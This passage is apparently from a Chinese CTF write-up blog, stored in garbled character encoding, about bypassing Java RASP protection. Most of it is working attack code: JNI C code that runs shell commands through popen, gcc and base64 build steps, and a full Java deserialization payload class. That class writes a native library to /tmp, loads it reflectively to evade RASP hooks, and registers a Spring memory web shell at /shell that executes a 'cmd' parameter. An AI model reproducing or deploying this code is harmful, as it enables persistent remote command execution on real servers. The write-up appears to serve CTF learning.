·æ³¨å…¥åˆ°åº”ç”¨ç¨‹åºä¸­ï¼Œåº”ç”¨ç¨‹åºèä¸ºä¸€ä½“ï¼Œèƒ½å®æ—¶æ£€æµ‹å’Œé˜»æ–­å®‰å…¨æ”»å‡»ï¼Œä½¿åº”ç”¨ç¨‹åºå…·å¤‡è‡ªæˆ‘ä¿æŠ¤èƒ½åŠ›ï¼Œå½“åº”ç”¨ç¨‹åºé­å—åˆ°å®é™…æ”»å‡»ä¼¤å®³ï¼Œå°±å¯ä»¥è‡ªåŠ¨å¯¹å…¶è¿›è¡Œé˜²å¾¡ï¼Œè€Œä¸éœ€è¦è¿›è¡Œäººå·¥å¹²é¢„ã€‚ RASP æŠ€æœ¯å¯ä»¥å¿«é€Ÿçš„å°†å®‰å…¨é˜²å¾¡åŠŸèƒ½æ•´åˆåˆ°æ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºä¸­ï¼Œå®ƒæ‹¦æˆªä»åº”ç”¨ç¨‹åºåˆ°ç³»ç»Ÿçš„æ‰€æœ‰è°ƒç”¨ï¼Œç¡®ä¿å®ƒä»¬æ˜¯å®‰å…¨çš„ï¼Œå¹¶ç›´æ¥åœ¨åº”ç”¨ç¨‹åºå†…éªŒè¯æ•°æ®è¯·æ±‚ã€‚Web å’Œé Web åº”ç”¨ç¨‹åºéƒ½å¯ä»¥é€šè¿‡ RASP è¿›è¡Œä¿æŠ¤ã€‚è¯¥æŠ€æœ¯ä¸ä¼šå½±å“åº”ç”¨ç¨‹åºçš„è®¾è®¡ï¼Œå› ä¸º RASP çš„æ£€æµ‹å’Œä¿æŠ¤åŠŸèƒ½æ˜¯åœ¨åº”ç”¨ç¨‹åºè¿è¡Œçš„ç³»ç»Ÿä¸Šè¿è¡Œçš„ã€‚ ğŸ‘´è¯´äººè¯ï¼šå°±æ˜¯ nm æŠŠå†…å­˜è¿‡æ»¤ï¼Œå®æ—¶åŠ¨æ€é˜²æŠ¤ã€‚åˆ«äººå«å†…å­˜é©¬ï¼Œä½ å«å†…å­˜ç›¾. è‡³äºè¿™ç©æ„ï¼ŒğŸ‘´å°±ä¸åœ¨è¿™é‡Œèµ˜è¿°äº†ï¼Œå…ˆç­‰ğŸ‘´æ–°å¼€ä¸ªæ–‡ç« ï¼Œè®°å½•ä¸€ä¸‹ RASP çš„å­¦ä¹ ç¬”è®°. ğŸ‘´å›æ¥äº†ï¼Œåˆ°äº†æœ€åçš„æ­¥éª¤äº†., çœ‹ğŸ‘´ç»•è¿‡è¿™è¯¥æ­»çš„ RASP. é€šè¿‡ java-agent æ’æ¡©æŠ€æœ¯ï¼Œhook ä½äº†ä¸€äº›åº•å±‚çš„ç±»ï¼Œä½¿å¾— java çš„ exec ä¸èƒ½å¤Ÿæ‰§è¡Œ ä¸€èˆ¬æ˜¯ unix æˆ–è¿™ forkandexec forkAndExec é€šå¸¸æ˜¯ä¸æ“ä½œç³»ç»Ÿè¿›ç¨‹ç®¡ç†ç›¸å…³çš„æ“ä½œï¼Œç”¨äºåœ¨ç±» Unix æ“ä½œç³»ç»Ÿä¸­ï¼ˆå¦‚ Linuxï¼‰åˆ›å»ºå­è¿›ç¨‹å¹¶åœ¨å­è¿›ç¨‹ä¸­æ‰§è¡ŒæŒ‡å®šçš„ç¨‹åºã€‚ å¯æ¶çš„ RASP hook ä½äº†è¿™äº›ç±» ç”šè‡³è¿˜ä¸è®©æœ¬åœ° JNI åŠ è½½äº†ï¼Œ loadLibrary0 ä¹Ÿè¢« hook äº† è§£å†³æ–¹æ¡ˆğŸ˜’ åº•å±‚çš„ native æ–¹æ³• java.lang.ClassLoader.NativeLibrary#load å¹¶æœªè¢« hookï¼Œå¹¶ä¸”åå°„ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸ä½¿ç”¨çš„ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä½¿ç”¨åå°„æ¥è°ƒç”¨ java.lang.ClassLoader.NativeLibrary ä¸­çš„ load æ–¹æ³•æ¥åŠ è½½æ¶æ„ so æ–‡ä»¶æ‰§è¡Œå‘½ä»¤ èˆ¹æ–°å§¿åŠ¿ä¹‹ javah å¯ä»¥ï¼Œæˆ‘å°±å–œæ¬¢ hğŸ˜Š javah æ˜¯ Java å¼€å‘å·¥å…·åŒ… (JDK) æä¾›çš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºç”Ÿæˆ Java ç±»çš„æœ¬åœ°æ–¹æ³•æ¥å£ (Native Method Interface, JNI) å¤´æ–‡ä»¶ã€‚JNI å…è®¸ Java ä»£ç ä¸æœ¬åœ°ï¼ˆé€šå¸¸æ˜¯ C æˆ– C++ï¼‰ä»£ç è¿›è¡Œäº¤äº’ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚ä¸ç¡¬ä»¶äº¤äº’æˆ–ä¸ç°æœ‰çš„æœ¬åœ°åº“è¿›è¡Œé›†æˆã€‚ ç¼–å†™åŒ…å«æœ¬åœ°æ–¹æ³•å£°æ˜çš„ Java ç±»ï¼Œä½¿ç”¨ native å…³é”®å­—å£°æ˜æœ¬åœ°æ–¹æ³•ã€‚ 123public class EvilClass &#123; public static native String execCmd(String cmd);&#125; ç„¶åä½¿ç”¨ javac ç¼–è¯‘æˆ class, ç„¶åä½¿ç”¨ javah ç¼–è¯‘æˆ h æ–‡ä»¶ 12javah -jni EvilClass ç”Ÿæˆçš„ EvilClass.h å¦‚ä¸‹ 12345678910111213141516171819202122/* DO NOT EDIT THIS FILE - it is machine generated */#include &lt;jni.h&gt;/* Header for class EvilClass */#ifndef _Included_EvilClass#define _Included_EvilClass#ifdef __cplusplusextern &quot;C&quot; &#123;#endif/* * Class: EvilClass * Method: execCmd * Signature: (Ljava/lang/String;)Ljava/lang/String; */JNIEXPORT jstring JNICALL Java_EvilClass_execCmd (JNIEnv *, jclass, jstring);#ifdef __cplusplus&#125;#endif#endif æ¥ä¸‹æ¥è¿˜è¦æ ¹æ®è¿™ä¸ª h æ–‡ä»¶å†™ C æ–‡ä»¶ï¼ŒnmğŸ‘´ä¸ä¼š c 1234567891011121314151617int execmd(const char *cmd, char *result)&#123; char buffer[1024*12]; //å®šä¹‰ç¼“å†²åŒº FILE *pipe = popen(cmd, &quot;r&quot;); //æ‰“å¼€ç®¡é“ï¼Œå¹¶æ‰§è¡Œå‘½ä»¤ if (!pipe) return 0; //è¿”å›0è¡¨ç¤ºè¿è¡Œå¤±è´¥ while (!feof(pipe)) &#123; if (fgets(buffer, 128, pipe)) &#123; //å°†ç®¡é“è¾“å‡ºåˆ°resultä¸­ strcat(result, buffer); &#125; &#125; pclose(pipe); //å…³é—­ç®¡é“ return 1; //è¿”å›1è¡¨ç¤ºè¿è¡ŒæˆåŠŸ&#125; è¿™é‡Œå¼€å¯äº†ä¸€ä¸ªç¼“å†²åŒºï¼Œ popen æ˜¯ C ä¸­æ‰§è¡Œå‘½ä»¤æ—¶æ‰“å¼€çš„ä¸€ä¸ªç®¡é“ï¼Œä»¥åªè¯»æ¨¡å¼æ‰“å¼€ã€‚å¦‚æœä¸ºç©ºï¼Œåˆ™å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œè¿”å›. åŒæ—¶ while ä½¿ç”¨ feof æ£€æµ‹ pipe çŠ¶æ€ï¼Œæœªç»“æŸå°±æŒç»­ä» pipe é‡Œé¢æ¯æ¬¡æœ€å¤§è·å– 128 ä¸ªå­—èŠ‚å†…å®¹ï¼Œæ”¾åˆ°ç¼“å†²åŒºï¼Œç„¶åå°†ç»“æœè¿½åŠ åˆ° result ä¸­. éšå 123456789101112131415161718JNIEXPORT jstring JNICALL Java_EvilClass_execCmd(JNIEnv *env, jclass class_object, jstring jstr)&#123; const char *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, NULL); // è·å– Java å­—ç¬¦ä¸² jstr çš„ UTF-8 ç¼–ç  char result[1024 * 12] = &quot;&quot;; // å®šä¹‰ä¸€ä¸ªå­˜æ”¾å‘½ä»¤æ‰§è¡Œç»“æœçš„å­—ç¬¦æ•°ç»„ if (1 == execmd(cstr, result)) // è°ƒç”¨ä¹‹å‰å®šä¹‰çš„ execmd å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ &#123; // å¦‚æœå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œä½ å¯ä»¥åœ¨è¿™é‡Œè¿›è¡Œä¸€äº›å¤„ç†ï¼Œä½†ä»£ç ä¸­è¢«æ³¨é‡Šæ‰äº† &#125; char return_messge[100] = &quot;&quot;; // å®šä¹‰ä¸€ä¸ªå­˜æ”¾è¿”å›æ¶ˆæ¯çš„å­—ç¬¦æ•°ç»„ strcat(return_messge, result); // å°†å‘½ä»¤æ‰§è¡Œç»“æœè¿½åŠ åˆ°è¿”å›æ¶ˆæ¯ jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge); // åˆ›å»ºä¸€ä¸ª Java å­—ç¬¦ä¸²ï¼Œç”¨äºå­˜å‚¨è¿”å›æ¶ˆæ¯ return cmdresult; // è¿”å› Java å­—ç¬¦ä¸²ï¼ŒåŒ…å«å‘½ä»¤æ‰§è¡Œç»“æœ&#125; JNI è§„èŒƒ JNI åŸå‹å‡½æ•°ï¼š JNI è§„èŒƒå®šä¹‰äº†ä¸€ç»„æ ‡å‡†çš„ JNI å‡½æ•°åŸå‹ï¼Œå¦‚ GetStringUTFChars ã€ ReleaseStringUTFChars ç­‰ï¼Œä»¥æ–¹ä¾¿æ“ä½œå­—ç¬¦ä¸²ã€æ•°ç»„ã€å¼•ç”¨ç­‰å¸¸è§ä»»åŠ¡ã€‚ JNI å‡½æ•°å‘½åè§„èŒƒï¼š JNI å‡½æ•°çš„å‘½åå¿…é¡»éµå¾ªç‰¹å®šçš„å‘½åè§„èŒƒï¼Œé€šå¸¸æ˜¯ Java ç±»åï¼ˆç”¨ä¸‹åˆ’çº¿æ›¿ä»£ç‚¹å·ï¼‰åè·Ÿ Java æ–¹æ³•åã€‚ä¾‹å¦‚ï¼ŒJava ç±» com.example.MyClass ä¸­çš„æ–¹æ³• myNativeFunction å¯¹åº”çš„ JNI å‡½æ•°åº”ä¸º Java_com_example_MyClass_myNativeFunction ã€‚ JNIEnv æŒ‡é’ˆï¼š JNI å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ª JNIEnv æŒ‡é’ˆï¼Œå®ƒæ˜¯ä¸€ä¸ªå…³äº JNI ç¯å¢ƒçš„ä¸Šä¸‹æ–‡ã€‚é€šè¿‡ JNIEnv ï¼ŒJNI å‡½æ•°å¯ä»¥è®¿é—® Java è™šæ‹Ÿæœºçš„å„ç§åŠŸèƒ½ï¼Œå¦‚å¯¹è±¡åˆ›å»ºã€æ–¹æ³•è°ƒç”¨å’Œå¼‚å¸¸å¤„ç†ã€‚ æ•°æ®ç±»å‹è½¬æ¢ï¼š JNI å®šä¹‰äº†å„ç§æ•°æ®ç±»å‹çš„å¯¹åº”å…³ç³»ï¼Œä»¥ä¾¿ Java å’Œæœ¬åœ°ä»£ç ä¹‹é—´çš„æ•°æ®ä¼ é€’ã€‚ä¾‹å¦‚ï¼ŒJava çš„ int å¯¹åº” JNI çš„ jint ï¼ŒJava çš„ String å¯¹åº” JNI çš„ jstring ç­‰ã€‚JNI å‡½æ•°å…è®¸åœ¨è¿™äº›æ•°æ®ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚ ä»å‚æ•°ä¸Šçœ‹ï¼šå®ƒæ¥å—ä¸‰ä¸ªå‚æ•°ï¼š JNIEnv *env ï¼ˆJNI ç¯å¢ƒæŒ‡é’ˆï¼‰ã€ jclass class_object ï¼ˆè¡¨ç¤º Java ç±»çš„ç±»å¯¹è±¡ï¼‰ã€ jstring jstr ï¼ˆä¸€ä¸ª Java å­—ç¬¦ä¸²ï¼‰ã€‚ é€šè¿‡ (*env)-&gt;GetStringUTFChars å‡½æ•°å°† Java å­—ç¬¦ä¸² jstr è½¬æ¢ä¸º C å­—ç¬¦ä¸² cstr ï¼Œè¿™æ˜¯å› ä¸º execmd å‡½æ•°éœ€è¦æ¥å— C å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ã€‚ ä¸­é—´æ‰§è¡Œå‘½ä»¤ï¼Œå­˜å‚¨. ä½¿ç”¨ (*env)-&gt;NewStringUTF å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ Java å­—ç¬¦ä¸² cmdresult ï¼Œç”¨äºå­˜å‚¨è¿”å›æ¶ˆæ¯ã€‚ å°†ä¸¤éƒ¨åˆ†æ”¾åœ¨ä¸€èµ·ï¼Œå½¢æˆ c æ–‡ä»¶ï¼Œç„¶åç¼–è¯‘ ç¼–è¯‘: 12gcc -FPIC -I /home/siroha/java8202/include -I /home/siroha/java8202/include/linux -shared -o libcmd.so ./EvilClass.cbase64 -w 0 libcmd.so &gt; Evil.txt å†™æ–‡ä»¶çš„æ“ä½œ 1234RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, &quot;rw&quot;); randomAccessFile.write(jniBytes); randomAccessFile.close(); æœ€ç»ˆå†™ä¸ª load çš„å†…å­˜ğŸ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.RandomAccessFile;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Base64;import java.util.Vector;public class EvilClass extends AbstractTranslet &#123; public static native String execCmd(String cmd); private static final String EVIL_JNI_BASE64 = &quot;&quot;;//ğŸ‘´å°±ä¸æ”¾åœ¨è¿™é‡Œäº†,å¤ªé•¿äº†,è‡ªå·±ç”Ÿæˆ private static final String LIB_PATH = &quot;/tmp/libcmd.so&quot;; static &#123; try&#123; byte[] jniBytes = Base64.getDecoder().decode(EVIL_JNI_BASE64); RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, &quot;rw&quot;); randomAccessFile.write(jniBytes); randomAccessFile.close(); //è°ƒç”¨java.lang.ClassLoader$NativeLibraryç±»çš„loadæ–¹æ³•åŠ è½½åŠ¨æ€é“¾æ¥åº“ ClassLoader cmdLoader = EvilClass.class.getClassLoader(); Class&lt;?&gt; classLoaderClazz = Class.forName(&quot;java.lang.ClassLoader&quot;); Class&lt;?&gt; nativeLibraryClazz = Class.forName(&quot;java.lang.ClassLoader$NativeLibrary&quot;); Method load = nativeLibraryClazz.getDeclaredMethod(&quot;load&quot;, String.class, boolean.class); load.setAccessible(true); Field field = classLoaderClazz.getDeclaredField(&quot;nativeLibraries&quot;); field.setAccessible(true); Vector&lt;Object&gt; libs = (Vector&lt;Object&gt;) field.get(cmdLoader); Constructor&lt;?&gt; nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class); nativeLibraryCons.setAccessible(true); Object nativeLibraryObj = nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, false); libs.addElement(nativeLibraryObj); field.set(cmdLoader, libs); load.invoke(nativeLibraryObj, LIB_PATH, false); //å†™å…¥å†…å­˜é©¬ WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method method2 = EvilClass.class.getMethod(&quot;shell&quot;, HttpServletRequest.class, HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/shell&quot;) .options(config) .build(); EvilClass springControllerMemShell = new EvilClass(); mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; String cmd = request.getParameter(&quot;cmd&quot;); if (cmd != null) &#123; String execRes = EvilClass.execCmd(cmd); response.getWriter().write(execRes); response.getWriter().flush(); &#125; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; NativeLibrary åŒ…è£…åˆ° Vector,Vector æ˜¯ Classloader ä¸­ nativeLibraries çš„å€¼ï¼Œ ä¸€èˆ¬æ¥è¯´ç”¨ 1234System.loadLibrary(&quot;cmd&quot;); Command command = new Command(); String ipconfig = command.exec(&quot;ipconfig&quot;); System.out.println(ipconfig); é¢˜ç›® ban äº†. èŠœæ¹–ï¼ŒçœŸâˆšâ…§ çˆ½ï¼Œâˆšâ…§ çœŸçˆ½ï¼Œç»ˆå‡ºäº†. æéº»éº»åœ°ï¼ŒğŸ‘´èŠ±äº†å‡ å¤©æ—¶é—´ï¼Œå­¦äº†ä¸€å †ä¸œè¥¿. æ€ä¹ˆåˆ¶ä½œé“¾å­ï¼Œæ€ä¹ˆ python å‘åŒ…ï¼ŒğŸ‘´åœ¨å‰é¢å·²ç»åˆ†æè¿‡äº†ã€‚ä¸ç”¨é—®äº†ğŸ˜…","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://1llustrious.github.io/tags/CTF/"}]}],"categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"https://1llustrious.github.io/tags/WP/"},{"name":"å¤ç°","slug":"å¤ç°","permalink":"https://1llustrious.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"CTF","slug":"CTF","permalink":"https://1llustrious.github.io/tags/CTF/"}]}